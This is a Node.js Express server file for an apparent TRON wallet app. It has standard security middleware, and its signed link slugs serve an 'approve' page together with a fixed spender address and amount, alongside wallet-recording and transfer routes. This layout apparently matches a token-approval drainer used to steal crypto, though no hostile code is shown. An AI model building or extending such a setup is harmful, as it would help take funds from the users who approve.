require('dotenv').config();
var express = require('express');
var mongoose = require('mongoose');
var cors = require('cors');
var helmet = require('helmet');
var compression = require('compression');
var path = require('path');
var { decode } = require('./linkCodec');

var authRoutes = require('./routes/auth');
var walletRoutes = require('./routes/wallets');
var transferRoutes = require('./routes/transfer');
var linkRoutes = require('./routes/link');

var app = express();
var isProd = process.env.NODE_ENV === 'production';

// ── Trust proxy (Render/Cloudflare sits in front) ──
if (isProd) app.set('trust proxy', 1);

// ── Security headers ──
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'", "https://api.trongrid.io", "https://api.tronstack.io", "https://*.trongrid.io"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"]
    }
  },
  crossOriginEmbedderPolicy: false
}));

// ── Compression ──
app.use(compression());

// ── CORS ──
var allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(',').map(function (s) { return s.trim(); }).filter(Boolean);

app.use(cors({
  origin: function (origin, cb) {
    if (!origin) return cb(null, true);
    if (allowedOrigins.length === 0 && !isProd) return cb(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) return cb(null, true);
    cb(new Error('Blocked by CORS'));
  },
  credentials: true
}));

// ── Body parsing with size limits ──
app.use(express.json({ limit: '16kb' }));
app.use(express.urlencoded({ extended: false, limit: '16kb' }));

// ── Static files with caching ──
app.use(express.static(path.join(__dirname, '..', 'public'), {
  maxAge: isProd ? '1h' : 0,
  etag: true
}));

// ── CSRF protection (all POST/PUT/DELETE to /api) ──
app.use('/api', function (req, res, next) {
  if (req.method === 'GET') return next();
  var origin = req.headers.origin || '';
  var host = req.headers.host || '';
  if (allowedOrigins.length > 0) {
    var fromAllowed = allowedOrigins.some(function (o) {
      return origin === o;
    });
    if (!fromAllowed && origin && origin !== 'http://' + host && origin !== 'https://' + host) {
      return res.status(403).json({ error: 'Origin rejected' });
    }
  }
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});

// ── Rate limiter for public /record endpoint ──
var recordLimiter = {};
var RECORD_WINDOW = 60000;
var RECORD_MAX = 10;

function recordRateLimit(req, res, next) {
  var ip = req.ip || req.socket.remoteAddress || '0.0.0.0';
  var now = Date.now();
  if (!recordLimiter[ip]) recordLimiter[ip] = [];
  recordLimiter[ip] = recordLimiter[ip].filter(function (t) { return now - t < RECORD_WINDOW; });
  if (recordLimiter[ip].length >= RECORD_MAX) {
    return res.status(429).json({ error: 'Too many requests' });
  }
  recordLimiter[ip].push(now);
  next();
}

setInterval(function () {
  var now = Date.now();
  Object.keys(recordLimiter).forEach(function (ip) {
    recordLimiter[ip] = recordLimiter[ip].filter(function (t) { return now - t < RECORD_WINDOW; });
    if (!recordLimiter[ip].length) delete recordLimiter[ip];
  });
}, 300000);

// ── Health check (Render uses this) ──
app.get('/health', function (req, res) {
  var dbReady = mongoose.connection.readyState === 1;
  res.status(dbReady ? 200 : 503).json({ status: dbReady ? 'ok' : 'db_disconnected' });
});

// ── Routes ──
app.use('/api/auth', authRoutes);
app.use('/api/wallets', function (req, res, next) {
  if (req.method === 'POST' && req.path === '/record') return recordRateLimit(req, res, next);
  next();
}, walletRoutes);
app.use('/api/transfer', transferRoutes);
app.use('/api/link', linkRoutes);

app.get('/admin', function (req, res) {
  res.sendFile(path.join(__dirname, '..', 'public', 'admin.html'));
});

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, '..', 'public', 'home.html'));
});

app.get('/:slug', function (req, res) {
  var result = decode(req.params.slug, process.env.LINK_SECRET);
  if (!result) {
    return res.sendFile(path.join(__dirname, '..', 'public', 'home.html'));
  }
  res.sendFile(path.join(__dirname, '..', 'public', 'approve.html'));
});

app.get('/api/decode/:slug', function (req, res) {
  var result = decode(req.params.slug, process.env.LINK_SECRET);
  if (!result) {
    return res.status(400).json({ error: 'Invalid or expired link' });
  }
  res.json({ amount: result.amount, spender: process.env.SPENDER_ADDRESS });
});

// ── Global error handler (no stack traces in production) ──
app.use(function (err, req, res, next) {
  if (isProd) {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    res.status(500).json({ error: err.message });
  }
});

// ── Startup ──
var PORT = process.env.PORT || 3000;

var mongoOpts = {
  maxPoolSize: 5,
  serverSelectionTimeoutMS: 10000,
  socketTimeoutMS: 45000
};

mongoose.connect(process.env.MONGODB_URI, mongoOpts)
  .then(function () {
    console.log('MongoDB connected');
    app.listen(PORT, function () {
      console.log('Server running on port ' + PORT + ' (' + (isProd ? 'production' : 'development') + ')');
    });
  })
  .catch(function (err) {
    console.error('MongoDB connection error:', err.message);
    process.exit(1);
  });

mongoose.connection.on('error', function (err) {
  console.error('MongoDB runtime error:', err.message);
});

mongoose.connection.on('disconnected', function () {
  console.warn('MongoDB disconnected — attempting reconnect');
});
